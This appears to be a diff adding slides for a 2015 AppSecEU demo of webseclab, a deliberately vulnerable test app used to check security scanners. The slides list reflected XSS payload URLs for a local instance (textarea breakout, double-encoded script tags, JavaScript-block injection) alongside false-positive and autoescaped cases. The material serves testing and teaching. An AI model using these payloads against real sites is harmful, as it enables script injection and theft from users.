@@ -1,0 +1,147 @@
+Webseclab - Demo
+AppSecEU, "Finding Bad Needles on a Worldwide Scale"
+22 May 2015
+Tags: golang, web application security, webseclab
+
+Dmitry Savintsev
+Paranoid, Yahoo!
+https://github.com/dmitris
+https://github.com/yahoo/webseclab
+@dimisec
+
+
+* Webseclab Proof-of-Exploits (PoEs)
+- Most sample PoEs are given in the README.md:
+.link https://github.com/yahoo/webseclab#webseclab-tests
+- Firefox recommended (no XSSAuditor and such)
+
+* Textarea injection
+
+.link http://127.0.0.1:8080/xss/reflect/textarea1?in=foo1
+
+Exploit:
+
+.link http://127.0.0.1:8080/xss/reflect/textarea1?in=foo1%3C/textarea%3E%3Cimg%20src=foo%20onerror=alert%28/GAME_OVER/%29%3E
+
+
+* Textarea False Positive Case
+.link http://127.0.0.1:8080/xss/reflect/textarea1_fp?in=foo1
+
+closing </textara> tag filtered out
+
+An attempt:
+
+.link http://127.0.0.1:8080/xss/reflect/textarea1_fp?in=foo1%3C/textarea%3E%3Cimg%20src=foo%20onerror=alert%2812345%29%3E%3C/textarea%3E
+
+Server response:
+ 
+ <textarea name="in" rows="5" cols="60">foo1<img src=foo onerror=alert(12345)></textarea>
+
+No way to break out of the textarea "sandbox".
+
+* Double-Encoded Injection
+
+.link http://127.0.0.1:8080/xss/reflect/doubq1?in=x
+
+* Double-Encoded Injection (2)
+
+.link http://127.0.0.1:8080/xss/reflect/doubq1?in=x
+
+URL encode the payload twice, as in encodeURIComponent(encodeURIComponent(payload))
+
+intended injection result:
+
+ "><script>alert(123)</script>
+
+uriencoded once:
+ 
+ %22%3E%3Cscript%3Ealert(123)%3C%2Fscript%3E
+
+uriencoded twice:
+
+ %2522%253E%253Cscript%253Ealert(123)%253C%252Fscript%253E
+
+* Double-Encoded Injection XSS
+
+Attack URL:
+
+.link http://127.0.0.1:8080/xss/reflect/doubq1?in=%253Cscript%253Ealert%28%252FXSS%252F%29%253C%252Fscript%253E 
+
+Server Response:
+
+ The value of the cgi parameter &quot;in&quot; is: <script>alert(/XSS/)</script>
+
+* Injection into Javascript block
+.link http://127.0.0.1:8080/xss/reflect/js3?in=js3
+
+Server's response:
+ 
+ <script language="javascript">
+ var f = {
+        date: '',
+        week: '1',
+        bad: js3,
+        phase: '2',
+      };
+ </script>
+
+* Injection into Javascript block - Exploit
+
+PoE:
+
+.link http://127.0.0.1:8080/xss/reflect/js3?in=alert%28/YOU%20ARE%20HACKED/%29
+
+ <script language="javascript">
+ var f = {
+        date: '',
+        week: '1',
+        bad: alert(/YOU ARE HACKED/),
+        phase: '2',
+      };
+ </script>
+
+* Javascript Injection False Positive
+
+Exploit attempts:
+
+.link http://127.0.0.1:8080/xss/reflect/js3_fp?in=alert%28/YOU%20ARE%20HACKED/%29
+
+Server's response:
+
+ <!doctype html>
+ <script language="javascript">
+ var f = {
+        // [...],
+        date: '',
+        week: '1',
+        good: 'alert(/YOU ARE HACKED/)',
+        // [...]
+      };
+ </script>
+
+Try also closing </script> and single quote injection:
+
+.link http://127.0.0.1:8080/xss/reflect/js3_fp?in=</script><script>alert(1356)</script>
+
+.link http://127.0.0.1:8080/xss/reflect/js3_fp?in=HELLO%27HOW
+
+* .ok cases
+
+if URL path ends with .ok, html autoescaping templates are used
+
+.link http://127.0.0.1:8080/xss/reflect/textarea1.ok?in=foo1%3C/textarea%3E%3Cimg%20src=foo%20onerror=alert%28/GAME_OVER/%29%3E
+
+.link http://127.0.0.1:8080/xss/reflect/js3.ok?in=alert%28/YOU%20ARE%20HACKED/%29
+
+* Corporate Network Safety
+
+.link http://foobar.example.com:8080
+
+FQDN URLs are *always* redirected to the IP addresses to protect sensitive cookies:
+ 
+ # assuming an entry in /etc/hosts:
+ # 127.0.0.1 foobar.example.com
+ http://foobar.example.com:8080/xss/reflect/full1?in=change_me
+ =>
+ http://127.0.0.1:8080/xss/reflect/full1?in=change_me
+
